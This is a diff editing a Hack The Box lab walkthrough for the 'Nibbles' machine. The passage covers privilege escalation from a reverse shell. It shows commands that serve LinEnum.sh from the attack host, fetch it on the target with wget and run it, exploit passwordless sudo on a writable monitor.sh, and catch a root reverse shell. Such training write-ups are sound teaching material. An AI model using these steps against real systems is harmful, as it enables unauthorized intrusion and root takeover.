@@ -1,4 +1,5 @@
-- Now that we have a reverse shell connection, it is time to escalate privileges. We can unzip the `personal.zip` file and see a file called `monitor.sh`.
+- Now that we have a reverse shell connection, it is time to escalate privileges. 
+- Unzip the `personal.zip` file and see a file called `monitor.sh`.
 ```shell-session
 nibbler@Nibbles:/home/nibbler$ unzip personal.zip
 
@@ -8,7 +9,8 @@ Archive:  personal.zip
    creating: personal/stuff/
   inflating: personal/stuff/monitor.sh 
 ```
-- The shell script `monitor.sh` is a monitoring script, and it is owned by our `nibbler` user and writeable.
+- The shell script `monitor.sh` is a monitoring script, and it is owned by our `nibbler` user.
+- It is also shown to be writeable as well.
 ```shell-session
 nibbler@Nibbles:/home/nibbler/personal/stuff$ cat monitor.sh
 
@@ -50,8 +52,9 @@ done
 
  <SNIP>
 ```
-- Let us put this aside for now and pull in [LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh) to perform some automated privilege escalation checks. 
-- First, download the script to your local attack VM or the Pwnbox and then start a `Python` HTTP server using the command `sudo python3 -m http.server 8080`.
+- Let pull up [LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh) to perform some automated privilege escalation checks. 
+- First, download the script to your local attack VM or the Pwnbox.
+- Next, start a `Python` HTTP server using the command `sudo python3 -m http.server 8080`.
 ```shell-session
 secmancer@htb[/htb]$ sudo python3 -m http.server 8080
 [sudo] password for ben: ***********
@@ -59,8 +62,10 @@ secmancer@htb[/htb]$ sudo python3 -m http.server 8080
 Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
 10.129.42.190 - - [17/Dec/2020 02:16:51] "GET /LinEnum.sh HTTP/1.1" 200 -
 ```
-- Back on the target type `wget http://<your ip>:8080/LinEnum.sh` to download the script. If successful, we will see a 200 success response on our Python HTTP server. 
-- Once the script is pulled over, type `chmod +x LinEnum.sh` to make the script executable and then type `./LinEnum.sh` to run it. 
+- Back on the target type `wget http://<your ip>:8080/LinEnum.sh` to download the script. 
+- If successful, we will see a 200 success response on our Python HTTP server. 
+- Once the script is pulled over, type `chmod +x LinEnum.sh` to make the script executable.
+- Type `./LinEnum.sh` to run it. 
 - We see a ton of interesting output but what immediately catches the eye are `sudo` privileges.
 ```shell-session
 [+] We can sudo without supplying a password!
@@ -90,10 +95,8 @@ connect to [10.10.14.2] from (UNKNOWN) [10.129.42.190] 47488
 
 uid=0(root) gid=0(root) groups=0(root)
 ```
-- From here, we can grab the `root.txt` flag. Finally, we have now solved our first box on HTB. 
-- Try to replicate all of the steps on your own. Try various tools to achieve the same effect. 
-- We can use many different tools for the various steps required to solve this box. This walkthrough shows one possible method. Make sure to take detailed notes to practice that vital skillset.
-
+- From here, we can grab the `root.txt` flag. 
+- Congrats, we solved our first box on HTB!
 
 ### Questions
 - Escalate privileges and submit the root.txt flag.
